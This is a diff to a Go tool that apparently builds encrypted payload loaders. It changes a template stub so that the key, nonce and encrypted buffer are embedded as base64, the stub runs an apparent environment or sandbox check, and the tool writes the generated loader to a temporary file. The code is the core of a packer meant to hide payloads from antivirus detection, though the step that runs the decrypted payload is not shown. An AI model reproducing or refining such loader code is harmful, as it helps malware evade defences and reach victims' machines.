@@ -14,21 +14,16 @@ var template = `package main
 
 import (
 	"encoding/base64"
-	"encoding/hex"
+	"gld/detect"
 	"gld/loader"
 	"gld/util"
-	"gld/detect"
-)
-
-var (
-	key, _   = hex.DecodeString("%x")
-	nonce, _ = hex.DecodeString("%x")
 )
 
 func main() {
 	if !detect.ContinueRun() { return }
-	if loader.Init() != nil { return }
 
+	key, _ := base64.StdEncoding.DecodeString("%s")
+	nonce, _ := base64.StdEncoding.DecodeString("%s")
 	buf, _ := base64.StdEncoding.DecodeString("%s")
 	buf = util.D(buf, key, nonce)
 	
@@ -57,9 +52,16 @@ func main() {
 	rand.Read(nonce)
 
 	raw = util.E(raw, key, nonce)
-
-	flw := base64.StdEncoding.EncodeToString(raw)
-	err = ioutil.WriteFile(TEMP, []byte(fmt.Sprintf(template, key, nonce, flw)), 0777)
+	err = ioutil.WriteFile(
+		TEMP,
+		[]byte(fmt.Sprintf(
+			template,
+			base64.StdEncoding.EncodeToString(key),
+			base64.StdEncoding.EncodeToString(nonce),
+			base64.StdEncoding.EncodeToString(raw)),
+		),
+		0777,
+	)
 	if err != nil {
 		println("[!] Generate fail: " + err.Error())
 		return
